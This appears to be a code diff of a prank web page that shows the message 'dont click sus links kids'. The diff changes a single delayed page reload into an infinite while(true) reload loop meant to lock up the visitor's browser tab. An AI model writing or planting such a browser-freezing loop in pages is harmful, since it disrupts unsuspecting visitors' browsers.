@@ -1,61 +1,26 @@
-<!DOCTYPE html>
-<html>
-<head>
 <style>
-  body {
-    background: url("rickroll.mp4") no-repeat center;
+  body{
+    background:url("bg.gif");
+    background-position: center;
+    background-repeat: no-repeat;
     background-size: cover;
   }
-  #dcslk {
-    position: absolute;
-    width: 100%;
-    left: 0;
-    top: 50%;
-    transform: translateY(-50%);
-    color: black;
-    text-align: center;
-  }
-  #loadingbg, #loading {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    left: 0;
-    top: 0;
-    background-color: black;
-    color: white;
-    text-align: center;
-    display: none;
-  }
 </style>
-</head>
-<body>
-
-<div id="dcslk">
-  <h1><b>dont click sus links kids</b></h1>
-</div>
-
-<div id="loadingbg"></div>
-<div id="loading">
-  <h1><b>Loading...</b></h1>
-</div>
-
+<div id="dcslk" style="position:absolute;width:100%;left:0px;top:0px;color:black;text-align:center;"><h1><b>dont click sus links kids</b></h1></div>
+<div id="loadingbg" style="position:absolute;width:100%;height:100%;left:0px;top:0px;background-color:black;color:white;text-align:center;"></div>
+<div id="loading" style="position:absolute;width:100%;left:0px;top:0px;background-color:black;color:white;text-align:center;"><h1><b>Loading...</b></h1></div>
 <script>
-  var loading = document.getElementById("loading");
-  loading.style.top = (window.innerHeight / 2) - (loading.offsetHeight / 2) + "px";
-  
-  var dcslk = document.getElementById("dcslk");
-  dcslk.style.top = (window.innerHeight / 2) - (dcslk.offsetHeight / 2) + "px";
-
-  window.onload = function() {
-    document.getElementById("loading").style.display = "none";
-    document.getElementById("loadingbg").style.display = "none";
-    
-    // Set a timeout to reload the page every 100 milliseconds (not recommended)
-    setTimeout(function() {
-      window.location.reload();
-    }, 100);
+  var loading=document.getElementById("loading");
+  loading.style.top=window.innerHeight/2-loading.offsetHeight/2;
+  var dcslk=document.getElementById("dcslk");
+  dcslk.style.top=window.innerHeight/2-dcslk.offsetHeight/2;
+  window.onload=function(){
+    document.getElementById("loading").style.display="none";
+    document.getElementById("loadingbg").style.display="none";
+    setTimeout(() => {
+      while (true){
+        window.location.reload();
+      }
+    },100);
   };
 </script>
-
-</body>
-</html>
